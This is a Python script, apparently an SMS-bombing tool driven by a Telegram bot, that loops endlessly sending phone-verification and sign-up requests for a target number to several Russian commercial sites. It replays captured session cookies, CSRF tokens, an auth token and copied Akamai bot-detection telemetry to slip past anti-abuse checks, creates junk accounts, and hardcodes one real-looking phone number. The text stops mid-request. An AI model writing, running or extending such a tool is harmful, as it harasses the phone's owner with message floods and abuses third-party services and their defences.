import requests

import utilities

import telebot

from threading import Thread

import time 

import config

def run_sms(phone, userid):


    while True:
        headers = {
            'Connection': 'keep-alive',
            'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'sec-ch-ua-mobile': '?0',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
            'Content-Type': 'application/json',
            'Origin': 'https://sunlight.net',
            'Sec-Fetch-Site': 'same-site',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        }

        data = '{"phone":"' + phone + '"}'

        response1 = requests.post('https://api.sunlight.net/v3/customers/authorization/', headers=headers, data=data)
        print(response1.status_code, 'sunlight')

        time.sleep(2)

        cookies = {
            '.ASPXANONYMOUS': 'nXpyv9H4gkmzD_ZKefwG_Q',
            '_SL_': '6.83.',
            '_ipl': '6.83.',
            'AB_HOME': 'Test_00084_B',
            'AB_HOME_DIRECT': 'always',
            'AB_MFOSELECTION': 'Test_00085_B',
            'AB_MFOSELECTION_DIRECT': 'always',
            '__utmz': 'utmccn%3dsravni_global_g_search_msk_brand%7cutmcct%3d531810804955--kwd-297691854613--962698255--47042708559----g--_c--9047022------sravni.ru_e--%7cutmcmd%3dcpc%7cutmcsr%3dgoogle%7cutmctr%3dsravni.ru',
            '__utmx': 'utmccn%3dsravni_global_g_search_msk_brand%7cutmcct%3d531810804955--kwd-297691854613--962698255--47042708559----g--_c--9047022------sravni.ru_e--%7cutmcmd%3dcpc%7cutmcsr%3dgoogle%7cutmctr%3dsravni.ru',
            '_gcl_aw': 'GCL.1629468298.Cj0KCQjwpf2IBhDkARIsAGVo0D0J_m9-dRVBVN-Z8I7I7BktdLLdGFMR2h5LW_XhnT5K5Qp9RAqwhbkaAtg7EALw_wcB',
            '_gcl_au': '1.1.1294774155.1629468298',
            'clid': 'gclid|Cj0KCQjwpf2IBhDkARIsAGVo0D0J_m9-dRVBVN-Z8I7I7BktdLLdGFMR2h5LW_XhnT5K5Qp9RAqwhbkaAtg7EALw_wcB',
            '_ga': 'GA1.2.675879945.1629468298',
            '_gid': 'GA1.2.272185620.1629468298',
            '_gac_UA-8755402-16': '1.1629468298.Cj0KCQjwpf2IBhDkARIsAGVo0D0J_m9-dRVBVN-Z8I7I7BktdLLdGFMR2h5LW_XhnT5K5Qp9RAqwhbkaAtg7EALw_wcB',
            '_gac_UA-8755402-14': '1.1629468298.Cj0KCQjwpf2IBhDkARIsAGVo0D0J_m9-dRVBVN-Z8I7I7BktdLLdGFMR2h5LW_XhnT5K5Qp9RAqwhbkaAtg7EALw_wcB',
            '_ym_uid': '1629468299122073106',
            '_ym_d': '1629468299',
            '_ym_isad': '1',
            '_ym_visorc': 'b',
            'uid': 'UbGokWEftopsr2fRA40jAg==',
            '.AspNetCore.Antiforgery.vnVzMy2Mv7Q': 'CfDJ8J96m9uv8aZPiBSemDUDOYOfA0H_DtJZIOBcQxz694S5YD4GpHCYB5h9tt4fXKVHJP7MVclZSp8IH0ECqrXB3nQHmdvof1qt1dPOLxzmUBt_dD5QTHu2P6DAWjOB8LYqXse6gkWDR6Gd_vFa1hmkmCc',
            '_ga_WE262B3KPE': 'GS1.1.1629468297.1.0.1629468302.55',
            'tmr_lvid': 'a3ad9be91962398f2d369cfb85a01509',
            'tmr_lvidTS': '1629468302634',
            'tmr_reqNum': '4',
            '_gali': 'userBlock',
        }

        headers = {
            'Connection': 'keep-alive',
            'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
            'sec-ch-ua-mobile': '?0',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept': '*/*',
            'Origin': 'https://my.sravni.ru',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://my.sravni.ru/signin?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Dwww%26scope%3Dopenid%2520offline_access%2520email%2520phone%2520profile%2520roles%2520Sravni.Reviews.Service%2520Sravni.Osago.Service%2520Sravni.QnA.Service%2520Sravni.FileStorage.Service%2520Sravni.Memory.Service%2520reviews%2520Sravni.PhoneVerifier.Service%2520Sravni.Identity.Service%2520Sravni.VZR.Service%2520messagesender.sms%2520Sravni.Affiliates.Service%2520esia%2520orders.r%26response_type%3Dcode%2520id_token%2520token%26redirect_uri%3Dhttps%253A%252F%252Fwww.sravni.ru%252Fopenid%252Fcallback%252F%26response_mode%3Dform_post%26state%3DQ_60LeZi1vkySKYnmEd8oYjnwAruhwjsrE4DB6iY-j0%26nonce%3D35MNGvxjcpSW5ZVZipX_50xZABdmVMPoA-Tv8mafR7E%26login_hint%26acr_values&isinnerframe=true',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        }

        data = {
          '__RequestVerificationToken': 'CfDJ8J96m9uv8aZPiBSemDUDOYPQSBsA8geGOGrkDVa1q_fXdUOC3pCXqQYiDYzpTLpOct70jxdJnmCyFKwmEQLCN_9IK-V-iiBGHLQD4lnHgE1IPGYah1FtQa2qCe1pNXh56MVQCRMz7XbbekWFhz-a7PQ',
          'phone': '+' + phone,
          'returnUrl': '/connect/authorize/callback?client_id=www&amp;scope=openid%20offline_access%20email%20phone%20profile%20roles%20Sravni.Reviews.Service%20Sravni.Osago.Service%20Sravni.QnA.Service%20Sravni.FileStorage.Service%20Sravni.Memory.Service%20reviews%20Sravni.PhoneVerifier.Service%20Sravni.Identity.Service%20Sravni.VZR.Service%20messagesender.sms%20Sravni.Affiliates.Service%20esia%20orders.r&amp;response_type=code%20id_token%20token&amp;redirect_uri=https%3A%2F%2Fwww.sravni.ru%2Fopenid%2Fcallback%2F&amp;response_mode=form_post&amp;state=Q_60LeZi1vkySKYnmEd8oYjnwAruhwjsrE4DB6iY-j0&amp;nonce=35MNGvxjcpSW5ZVZipX_50xZABdmVMPoA-Tv8mafR7E&amp;login_hint&amp;acr_values'
        }

        response2 = requests.post('https://my.sravni.ru/signin/code', headers=headers, cookies=cookies, data=data)

        print(response2.status_code, 'sravni')

        time.sleep(2)

        headers = {
            'Connection': 'keep-alive',
            'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
            'Accept': 'application/json, text/plain, */*',
            'X-Requested-With': 'XMLHTTPRequest',
            'sec-ch-ua-mobile': '?0',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
            'Content-Type': 'application/json;charset=UTF-8',
            'Origin': 'https://apteka-april.ru',
            'Sec-Fetch-Site': 'same-site',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://apteka-april.ru/',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        }

        data = '{"phone":' + phone +  ',"password":"wefew3fwergf21124eFERFWEF","pname":"WEFDFW11EFSFE","name":"WEFWEFSDF11WEF","sname":"DWEF112F","email":"DQWFDWERG11ERWGF@gmail.com"}'

        response3 = requests.post('https://web-api.apteka-april.ru/users', headers=headers, data=data)

        print(response3.status_code, "apteka-april")

        time.sleep(2)


        headers = {
            'authority': 'www.askona.ru',
            'x-fancybox': 'true',
            'accept': 'text/html, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'sec-ch-ua-mobile': '?0',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.askona.ru/?utm_source=google&utm_medium=cpc&utm_campaign=ga_brand_all_msk_search_general&utm_term=askona.e.kwd-4434489473&utm_content=27010770428.524529974636.317512268..c&gclid=Cj0KCQjwpf2IBhDkARIsAGVo0D0yEUM7MgLfrldihzCQHqchBKhWXAfSc8wI6HEs6SbmQGYjwtckOqMaAgZEEALw_wcB',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            '$cookie': 'BITRIX_SM_PK=457ed93f46978385969e18ff6e57ed3f; BITRIX_SM_LOCATION_CODE=84; BITRIX_SM_SALE_UID=160704617; _gcl_au=1.1.977662134.1629468280; _gid=GA1.2.1050688298.1629468280; tmr_lvid=0139d208d6b728c6baa2a1f80a8564fe; tmr_lvidTS=1629468279893; _wid=zBCekE/dTE5hkTa2Ane3; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A10%2C%22EXPIRE%22%3A1629493140%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ct_ids=vwgixinz%3A38342%3A216904038; _ct_site_id=38342; _ct_session_id=216904038; _ct=1400000000160658565; _ct_client_global_id=d4d281e4-83cf-5888-b444-986bba789d31; supersales_test_15_06_2021=2%3A1; _ym_uid=1629468282109036000; _ym_d=1629468282; _ym_isad=1; rrpvid=601721869756322; rcuid=611c0d647e53c40001ba7852; cted=modId%3D5tfjfgj3%3Bclient_id%3D1382827279.1629468280%7CmodId%3Dvwgixinz%3Bclient_id%3D1382827279.1629468280%3Bya_client_id%3D1629468282109036000; _acfId=9cadc7c2-0908-49a0-9ab4-110b651ab2ab; uxs_uid=931aef40-01bf-11ec-9363-8b8bc6382213; _userGUID=0:kskfcga4:oiSIkE08MMi0kBkFkv0m6itThFWkI9s_; dSesn=fff97e08-8faa-a32c-8a9b-eae42e1a88db; _dvs=0:kskfcga4:ZvJGMArbA2PyaMKPziMVHqPRb79DSp5_; flocktory-uuid=dea19d86-8bc4-488b-b6c7-6fa648f98749-6; cto_bundle=JhkJdF9DTGRiZmJFWFZZT1RNaXNCSmlYSkRUJTJGUmxPemlUTGd6TEclMkJaSGtWWFVKV1ljZWl3MDB4ODQ1YVNtRWl0ajdRZXNnTUs0VjVNWE11RDdMR1RndkVOSk1wNFQyWXRSOGdGOHE2eGFuQ3hOMHU4U1NwRGY3VnMyNWpDQ2VvM0kwNFNTMXZ0UGZ4SmNqdUpvU3h0aVREMERnJTNEJTNE; kameleoonVisitorCode=_js_nsdun0t66z9vnxld; PHPSESSID=f5mqdtnh7ik177ahvmc8qftlq2; tmr_detect=1%7C1629469643041; _ga=GA1.2.1382827279.1629468280; _gac_UA-17566875-1=1.1629469644.Cj0KCQjwpf2IBhDkARIsAGVo0D0yEUM7MgLfrldihzCQHqchBKhWXAfSc8wI6HEs6SbmQGYjwtckOqMaAgZEEALw_wcB; _gat_UA-17566875-1=1; _gac_UA-67065974-3=1.1629469644.Cj0KCQjwpf2IBhDkARIsAGVo0D0yEUM7MgLfrldihzCQHqchBKhWXAfSc8wI6HEs6SbmQGYjwtckOqMaAgZEEALw_wcB; _gat_wtracker=1; call_s=%3C\\u0021%3E%7B%22vwgixinz%22%3A%5B1629471443%2C216904038%2C%7B%22155448%22%3A%22480530%22%7D%5D%2C%22d%22%3A2%7D%3C\\u0021%3E; _gac_UA-17566875-3=1.1629469645.Cj0KCQjwpf2IBhDkARIsAGVo0D0yEUM7MgLfrldihzCQHqchBKhWXAfSc8wI6HEs6SbmQGYjwtckOqMaAgZEEALw_wcB; _gat_UA-17566875-3=1; _gac_=1.1629469645.Cj0KCQjwpf2IBhDkARIsAGVo0D0yEUM7MgLfrldihzCQHqchBKhWXAfSc8wI6HEs6SbmQGYjwtckOqMaAgZEEALw_wcB; _ttgclid=Cj0KCQjwpf2IBhDkARIsAGVo0D0yEUM7MgLfrldihzCQHqchBKhWXAfSc8wI6HEs6SbmQGYjwtckOqMaAgZEEALw_wcB; _ttgclid=Cj0KCQjwpf2IBhDkARIsAGVo0D0yEUM7MgLfrldihzCQHqchBKhWXAfSc8wI6HEs6SbmQGYjwtckOqMaAgZEEALw_wcB; _ga_21M08Q47LQ=GS1.1.1629468279.1.1.1629469647.55; _gcl_aw=GCL.1629469648.Cj0KCQjwpf2IBhDkARIsAGVo0D0yEUM7MgLfrldihzCQHqchBKhWXAfSc8wI6HEs6SbmQGYjwtckOqMaAgZEEALw_wcB; beesender:79aaf40c-190d-43a6-98a9-2c2553cf3be7=undefined; BeesenderClientId=79AAF40C-190D-43A6-98A9-2C2553CF3BE7---bd6NNXX_ghxOYvlj8R-Dmw; beesender:79AAF40C-190D-43A6-98A9-2C2553CF3BE7=bd6NNXX_ghxOYvlj8R-Dmw; tmr_reqNum=34',
        }

        params = (
            ('phone', phone),
            ('gulp', '0'),
            ('csrf_token', 'be9f0300383dec4f4bfb8ad196685f76'),
        )

        response4 = requests.get('https://www.askona.ru/api/popup/register?phone=+79222633421&gulp=0&csrf_token=be9f0300383dec4f4bfb8ad196685f76', headers=headers)

        print(response4.status_code, "askona")

        time.sleep(2)

        headers = {
            'authority': 'i.api.kari.com',
            'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
            'accept': 'application/json, text/plain, */*',
            'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGllbnRJZCI6IjY0YmQ5NjQ5LWQxN2MtNDJjMC04ZDdkLWI1ZTQ5MjhhYWZjOCIsImlzVGVtcCI6dHJ1ZSwiaWF0IjoxNjI5NDY5MDU5LCJleHAiOjE2MzAwNzM4NTl9.vcv4ILkED070ZbWklbcDtHILbGNk6hN-8qNtG63UcCE',
            'sec-ch-ua-mobile': '?0',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
            'origin': 'https://kari.com',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://kari.com/',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'cookie': 'rees46VisitorSegment=H; KariLocationId=7700000000000; utm_source=google; utm_medium=cpc; utm_campaign=ga_rus_search_tg%3Akw_brand-time-for-school_g%3Aall_s%3Aall_a%3Aall_d%3Aall; utm_content=astat%3Akwd-389560150766%7Cret%3Akwd-389560150766%7Ccid%3A14226417746%7Cgid%3A131371668171%7Caid%3A538261643274%7Cpos%3A%7Cst%3A%7Csrc%3A%7Cdvc%3Ac%7Creg%3A9047022; utm_term=%2Bkari%7Cmt%3Ap; referrer=https%3A%2F%2Fwww.google.com%2F; KariTempToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGllbnRJZCI6IjY0YmQ5NjQ5LWQxN2MtNDJjMC04ZDdkLWI1ZTQ5MjhhYWZjOCIsImlzVGVtcCI6dHJ1ZSwiaWF0IjoxNjI5NDY5MDU5LCJleHAiOjE2MzAwNzM4NTl9.vcv4ILkED070ZbWklbcDtHILbGNk6hN-8qNtG63UcCE; _gcl_au=1.1.1889467062.1629469060; tmr_lvid=04cbccf145d629a776504ebc1b7bc1fc; tmr_lvidTS=1629469060704; _ga=GA1.2.2107195766.1629469061; _gid=GA1.2.1127688900.1629469061; _gac_UA-131156523-1=1.1629469061.Cj0KCQjwpf2IBhDkARIsAGVo0D3Jcm5PD-QH0wU2H79TwQDUYeWPyAQtmJlFdCHL-yJ2PB1qHjwKE3caAqeSEALw_wcB; _gcl_aw=GCL.1629469061.Cj0KCQjwpf2IBhDkARIsAGVo0D3Jcm5PD-QH0wU2H79TwQDUYeWPyAQtmJlFdCHL-yJ2PB1qHjwKE3caAqeSEALw_wcB; ssaid=61005390-01c1-11ec-98ab-4d5fd50e8a35; _gat_UA-131156523-1=1; _ym_uid=1629469061828693439; _ym_d=1629469061; _ym_isad=1; tmr_reqNum=5; __tld__=null; _ga_MR8XC96CH3=GS1.1.1629469060.1.1.1629469066.0; KariClientLocationConfirmed=true',
        }

        params = (
            ('phone', '+' + phone),
        )

        response5 = requests.get('https://i.api.kari.com/ecommerce/client/registration/verify/phone/code', headers=headers, params=params)

        print(response5.status_code, 'kari')


        time.sleep(2)

        headers = {
            'authority': 'ru.accounts.ikea.com',
            'sec-ch-ua': '^\\^Chromium^\\^;v=^\\^92^\\^, ^\\^',
            'accept': 'application/json, text/plain, */*',
            'sec-ch-ua-mobile': '?0',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
            'akamai-bm-telemetry': '7a74G7m23Vrp0o5c9278451.7-1,2,-94,-100,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36,uaend,12147,20030107,ru-RU,Gecko,3,0,0,0,400926,9179153,1920,1040,1920,1080,873,937,1920,,cpen:0,i1:0,dm:0,cwen:0,non:1,opc:0,fc:0,sc:0,wrc:1,isc:0,vib:1,bat:1,x11:0,x12:1,8330,0.17171303685,814734592130.5,0,loc:-1,2,-94,-101,do_en,dm_en,t_en-1,2,-94,-105,-1,2,-94,-102,0,-1,0,0,2924,937,1;0,-1,0,0,2808,821,1;0,-1,0,0,3142,1155,1;0,2,0,0,2507,520,1;1,2,0,0,2870,883,1;0,-1,0,0,4842,1155,1;0,-1,0,0,4252,-1,0;0,-1,0,0,4253,-1,0;0,-1,0,0,4254,-1,0;0,-1,0,0,4255,-1,0;0,-1,0,0,4256,-1,0;0,-1,0,0,4257,-1,0;-1,2,-94,-108,0,1,8414,-2,0,0,937;1,3,8415,-2,0,0,937;2,1,8438,-2,0,0,937;3,3,8439,-2,0,0,937;4,1,8506,-2,0,0,937;5,3,8507,-2,0,0,937;6,2,8536,-2,0,0,937;7,2,8536,-2,0,0,937;8,2,8669,-2,0,0,937;9,1,8670,-2,0,0,937;10,3,8671,-2,0,0,937;11,1,8797,-2,0,0,937;12,3,8797,-2,0,0,937;13,2,8833,-2,0,0,937;14,2,8954,-2,0,0,937;15,1,8959,-2,0,0,937;16,3,8959,-2,0,0,937;17,1,8992,-2,0,0,937;18,3,8992,-2,0,0,937;19,2,9065,-2,0,0,937;20,2,9073,-2,0,0,937;21,1,9082,-2,0,0,937;22,3,9082,-2,0,0,937;23,2,9229,-2,0,0,937;24,1,9285,-2,0,0,821;25,3,9285,-2,0,0,821;26,1,9302,-2,0,0,821;27,3,9302,-2,0,0,821;28,1,9353,-2,0,0,821;29,3,9353,-2,0,0,821;30,2,9374,-2,0,0,821;31,2,9391,-2,0,0,821;32,1,9518,-2,0,0,821;33,3,9518,-2,0,0,821;34,2,9531,-2,0,0,821;35,1,9569,-2,0,0,821;36,3,9569,-2,0,0,821;37,2,9643,-2,0,0,821;38,1,9648,-2,0,0,821;39,3,9648,-2,0,0,821;40,2,9660,-2,0,0,821;41,2,9846,-2,0,0,821;42,1,9861,-2,0,0,821;43,3,9862,-2,0,0,821;44,1,10026,-2,0,0,821;45,3,10026,-2,0,0,821;46,2,10043,-2,0,0,821;47,1,10138,-2,0,0,821;48,3,10138,-2,0,0,821;49,2,10220,-2,0,0,821;50,2,10350,-2,0,0,821;51,1,10417,-2,0,0,1155;52,3,10417,-2,0,0,1155;53,2,10505,-2,0,0,1155;54,1,11389,-2,0,0,1155;55,3,11389,-2,0,0,1155;56,2,11452,-2,0,0,1155;57,1,11655,-2,0,0,1155;58,3,11655,-2,0,0,1155;59,2,11721,-2,0,0,1155;60,1,11826,-2,0,0,1155;61,3,11827,-2,0,0,1155;62,2,11889,-2,0,0,1155;63,1,11985,-2,0,0,1155;64,3,11985,-2,0,0,1155;65,2,12052,-2,0,0,1155;66,1,12167,-2,0,0,1155;67,3,12167,-2,0,0,1155;68,2,12244,-2,0,0,1155;69,1,12369,-2,0,0,1155;70,3,12369,-2,0,0,1155;71,2,12422,-2,0,0,1155;72,1,12519,-2,0,0,1155;73,3,12519,-2,0,0,1155;74,2,12595,-2,0,0,1155;75,1,12632,-2,0,0,1155;76,3,12632,-2,0,0,1155;77,2,12698,-2,0,0,1155;78,1,12747,-2,0,0,1155;79,3,12747,-2,0,0,1155;80,1,12865,-2,0,0,1155;81,3,12866,-2,0,0,1155;82,2,12894,-2,0,0,1155;83,2,12961,-2,0,0,1155;84,1,14761,-2,0,0,520;85,3,14762,-2,0,0,520;86,1,14783,-2,0,0,520;87,3,14783,-2,0,0,520;88,1,14796,-2,0,0,520;89,3,14796,-2,0,0,520;90,2,14807,-2,0,0,520;91,2,14809,-2,0,0,520;92,2,14936,-2,0,0,520;93,1,15012,-2,0,0,520;94,3,15012,-2,0,0,520;95,1,15176,-2,0,0,520;96,3,15177,-2,0,0,520;97,1,15196,-2,0,0,520;98,3,15196,-2,0,0,520;99,2,15213,-2,0,0,520;100,2,15213,-2,0,0,520;101,2,15350,-2,0,0,520;102,1,15350,-2,0,0,520;103,3,15351,-2,0,0,520;104,1,15381,-2,0,0,520;105,3,15381,-2,0,0,520;106,2,15435,-2,0,0,520;107,1,15502,-2,0,0,520;108,3,15502,-2,0,0,520;109,1,15601,-2,0,0,520;110,3,15602,-2,0,0,520;111,2,15633,-2,0,0,520;112,1,15718,-2,0,0,520;113,3,15718,-2,0,0,520;114,2,15771,-2,0,0,520;115,2,15785,-2,0,0,520;116,2,15807,-2,0,0,520;117,1,16105,16,0,8,520;118,1,16208,-2,0,8,520;119,3,16208,-2,0,8,520;120,2,16251,16,0,0,520;121,2,16328,-2,0,0,520;122,1,16712,-2,0,0,520;123,3,16712,-2,0,0,520;124,2,16785,-2,0,0,520;125,1,16849,-2,0,0,520;126,3,16849,-2,0,0,520;127,2,16923,-2,0,0,520;128,1,16970,-2,0,0,520;129,3,16971,-2,0,0,520;130,2,17074,-2,0,0,520;131,1,17080,-2,0,0,520;132,3,17081,-2,0,0,520;133,2,17160,-2,0,0,520;134,1,17253,-2,0,0,520;135,3,17253,-2,0,0,520;136,2,17343,-2,0,0,520;137,1,17431,-2,0,0,520;138,3,17431,-2,0,0,520;139,2,17515,-2,0,0,520;140,1,17618,-2,0,0,520;141,3,17618,-2,0,0,520;142,2,17692,-2,0,0,520;143,1,17695,-2,0,0,520;144,3,17695,-2,0,0,520;145,2,17764,-2,0,0,520;146,1,17876,-2,0,0,520;147,3,17876,-2,0,0,520;148,2,17915,-2,0,0,520;149,1,18974,-2,0,0,883;-1,2,-94,-110,0,1,37,946,529;1,1,118,945,529;2,1,134,944,529;3,1,234,942,529;4,1,266,942,530;5,1,283,941,530;6,1,303,941,531;7,1,349,940,531;8,1,374,939,531;9,1,382,939,532;10,1,432,938,532;11,1,482,937,533;12,1,542,936,533;13,1,624,936,534;14,1,639,935,534;15,1,683,934,534;16,1,733,933,534;17,1,783,932,534;18,1,833,931,534;19,1,850,930,534;20,1,917,929,534;21,1,933,928,534;22,1,967,926,534;23,1,1050,925,534;24,1,1067,924,535;25,1,1317,922,535;26,1,1484,921,535;27,1,1533,920,535;28,1,1793,919,535;29,1,1904,918,535;30,1,1930,918,536;31,1,1943,918,537;32,1,1954,918,538;33,1,1966,918,539;34,1,1983,918,544;35,1,2000,918,549;36,1,2016,919,556;37,1,2033,921,560;38,1,2050,922,565;39,1,2066,923,567;40,1,2083,923,568;41,1,2100,923,569;42,1,2116,924,571;43,1,2144,925,574;44,1,2156,925,575;45,1,2166,925,576;46,1,2182,926,576;47,1,2199,927,577;48,1,2216,927,578;49,1,2235,927,579;50,1,2250,927,580;51,1,2273,927,581;52,1,2283,927,582;53,1,2301,927,583;54,1,2316,927,584;55,1,2333,928,586;56,1,2350,929,589;57,1,2367,931,592;58,1,2382,932,595;59,1,2399,934,601;60,1,2416,937,606;61,1,2433,941,613;62,1,2449,945,620;63,1,2466,949,626;64,1,2483,954,633;65,1,2499,957,640;66,1,2516,960,648;67,1,2533,963,655;68,1,2550,966,661;69,1,2566,969,667;70,1,2582,972,673;71,1,2599,975,677;72,1,2616,976,679;73,1,2633,977,681;74,1,3594,977,680;75,1,3674,977,679;76,1,3683,976,679;77,1,3700,975,678;78,1,3730,974,677;79,1,3735,974,676;80,1,3755,973,676;81,1,3766,973,675;82,1,3786,973,674;83,1,3800,972,674;84,1,3850,971,674;85,1,3966,970,674;86,1,4234,969,674;87,1,4615,968,674;88,1,4808,967,674;89,1,4884,966,674;90,1,4933,965,674;91,1,4950,963,674;92,1,4999,962,673;93,1,5016,959,671;94,1,5032,957,669;95,1,5049,955,667;96,1,5066,952,666;97,1,5083,950,664;98,1,5100,949,663;99,1,5116,948,662;178,3,7065,831,249,1171;179,4,7164,831,249,1171;180,2,7164,831,249,1171;215,3,7763,864,389,1942;218,4,7856,865,390,1942;219,2,7856,865,390,1942;225,3,8038,866,387,937;227,4,8153,866,387,937;228,2,8153,866,387,937;274,3,9245,881,468,821;276,4,9326,882,468,-1;277,2,9326,882,468,-1;337,3,10398,966,560,1155;340,4,10489,967,560,1155;341,2,10489,967,560,1155;412,3,14550,952,679,520;416,4,14664,952,676,520;417,2,14664,952,676,520;464,3,18878,938,783,883;467,4,18988,938,783,883;468,2,18988,938,783,883;492,3,21015,1465,975,-1;494,4,21087,1466,975,-1;495,2,21087,1466,975,-1;567,3,22427,838,1132,1982;569,4,22500,838,1133,1982;570,2,22500,838,1133,1982;759,3,25207,603,1231,-1;761,4,25271,604,1231,-1;762,2,25271,604,1231,-1;-1,2,-94,-117,-1,2,-94,-111,-1,2,-94,-109,-1,2,-94,-114,-1,2,-94,-103,2,23989;3,25205;-1,2,-94,-112,https://ru.accounts.ikea.com/login?state=hKFo2SBMZ2YxN2NERGk1TTNfMEw2T1FCUjdFVWlRMlpKSDFoa6FupWxvZ2luo3RpZNkgYk5ocHVMaU9qSXlqOEFndHlEZzAyeDQ1TVJYdERISlqjY2lk2SA3Mm0ycGR5VUFnOXVMaVJTbDRjNGIwYjJ0a1ZpdmhabA&client=72m2pdyUAg9uLiRSl4c4b0b2tkVivhZl&protocol=oauth2&redirect_uri=https^%^3A^%^2F^%^2Fwww.ikea.com^%^2Fru^%^2Fru^%^2Fprofile^%^2Flogin^%^2F&response_type=code&ui_locales=ru-RU&code_chalenge=y7Eh2sPjOb1897a6ITVq1U7FF--ZRFyq4EKmqQPc91Y&code_chalenge_method=S256&scope=openid^%^20profile^%^20email&audience=https^%^3A^%^2F^%^2Fretail.api.ikea.com&registration=^%^7B^%^7D&consumer=OWF&auth0Client=eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiOS4xNS4wIn0^%^3D&gasid=GA1.2.1361912221.1629469175-1,2,-94,-115,2069868,890810,32,0,0,0,2960645,25345,0,1629469184261,15,17431,206,766,2905,20,0,25347,2817568,0,295D91AE91617212001B3BBFC678F34E~0~YAAQlQVJF8+WuVd7AQAAGnzuYwY6DjyjXkY8OoM4H86Y4fI6L3BabS1r093fc70vlZoJOY5K+RF9KNGfVTrRd20pmyqDaWAyMk+Ssck3jWbsAuxajyFaboP3InCCikgIDmGfQO4oh/vm1AxlZZmKsQ5iNXKEMNBgtl5e06j4Ue8sibGbLdHlq9/sJhNQDE7DGPhyUl5r9j2kHXi4sG8kSCOQTsU08RaJH057XMDUbZ8gLEnSM6gOWLddkYL2+P/gR98L6Fbk+OTb5Y5QBZu6sfwbCYQTM3orybRZO7L/yXiLMlvFbwI/9XfVD85UiTumXPp57oOONrhn50aFhqXfcEIp89KCoIhLHu62za9Fv2RNLWhV6fhayWuEE6uyp1tDMZ1P/7RHfzmXay5e3Pmk7gCuBEVELZzI2zC2QvhkKjQBtUg=~-1~-1~-1,39062,941,-742456300,30261693,PiZtE,74779,90,0,-1-1,2,-94,-106,1,0-1,2,-94,-119,20,20,20,20,40,40,20,20,20,20,0,1160,1000,160,-1,2,-94,-122,0,0,0,0,1,0,0-1,2,-94,-123,-1,2,-94,-124,-1,2,-94,-126,-1,2,-94,-127,-1,2,-94,-70,420217769;1243744842;dis;,7,8;true;true;true;-180;true;24;24;true;false;-1-1,2,-94,-80,5534-1,2,-94,-116,27537477-1,2,-94,-118,446507-1,2,-94,-129,-1,2,-94,-121,;5;15;0',
            'content-type': 'application/json',
            'origin': 'https://ru.accounts.ikea.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
